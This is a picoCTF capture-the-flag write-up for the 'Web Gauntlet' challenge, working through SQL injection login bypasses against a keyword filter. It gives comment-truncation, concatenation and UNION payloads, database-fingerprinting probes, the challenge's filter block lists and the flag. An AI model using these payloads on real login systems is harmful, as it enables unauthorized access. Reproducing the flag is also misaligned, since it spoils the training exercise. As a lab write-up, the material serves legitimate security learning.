# picoGym Level 88: Web Gauntlet 🧠🧠🧠
Source: https://play.picoctf.org/practice/challenge/88

## Goal
Can you beat the filters?<br>
Log in as admin http://shape-facility.picoctf.net:51943/<br>
http://shape-facility.picoctf.net:51943/filter.php

## What I learned
```
Useful filters/operators (OR, AND, LIKE, =, --)
    = → direct password check
    LIKE → can bypass by matching patterns ('a%' means anything starting with a)
    OR → always-true condition (' OR '1'='1)
    AND → can test conditions (' AND '1'='2 → false)
    -- → comment out rest of SQL to avoid syntax errors

Figure out what DB in password w/ SQL injection probes:
    ' UNION SELECT sqlite_version() --              SQLite
    ' UNION SELECT @@version --                     mySQL
    ' UNION SELECT version() --                     PostgreSQL
SELECT * FROM users WHERE username='admin' AND password='' UNION SELECT sqlite_version() -- '
Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /var/www/html/index.php on line 26

hacker'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;
    checks if username: hacker not exist
    UNION combines it with another query that selects all columns from users table but limits results to first entry (likely admin)
```             

## Solution
```
https://webshell.picoctf.org/

Browser: http://shape-facility.picoctf.net:51943/filter.php
Round1: or

# View Page Source
Browser: http://shape-facility.picoctf.net:51943/
<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Round 1 / 5</h5>
														<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>
								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>
								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>

# Note: Look at background has debug enabled
Username:   admin ⌨️
Password:   admin ⌨️
SELECT * FROM users WHERE username='admin' AND password='admin' 👀

Username:   admin'-- ⌨️
Password:   a ⌨️
SELECT * FROM users WHERE username='admin'--' AND password='a' 👀(PASSED)

Username:   admin'-- ⌨️
Password:   a ⌨️
# Result: Blank, means -- filtered/blocked
# Note: SQLite supports another type of comment style: /* */
Username:   admin'/*
Password:   a
SELECT * FROM users WHERE username='admin'/*' AND password='a' 👀(PASSED)

# Filters: or, and, like, =, --, >, <       Another Method: Statement Termination
Username:   admin'/* ⌨️                       admin'; ⌨️
Password:   a ⌨️                              a ⌨️
SELECT * FROM users WHERE username='admin'/*' AND password='a' 👀(PASSED)
SELECT * FROM users WHERE username='admin';' AND password='a' 👀(PASSED)

# Filters: or, and, like, =, --, >, <, admin
# Note: SQLite’s concatenation operator (||) reconstruct word admin
Username:   ad'||'min'; ⌨️                Username: hacker'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1; ⌨️
Password:   a ⌨️                          Password: a ⌨️
SELECT * FROM users WHERE username='ad'||'min';' AND password='a' 👀(PASSED)

# Filters: or, and, like, =, --, >, <, admin, union
Username:   ad'||'min'; ⌨️
Password:   a ⌨️
SELECT * FROM users WHERE username='ad'||'min';' AND password='a' 👀(PASSED)
Congrats! You won! Check out filter.php

Browser: http://shape-facility.picoctf.net:51943/filter.php
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_79a0ddc6} 🔐
?>
```

## Flag
picoCTF{y0u_m4d3_1t_79a0ddc6}

## Continue
[Continue](./picoGym0174.md)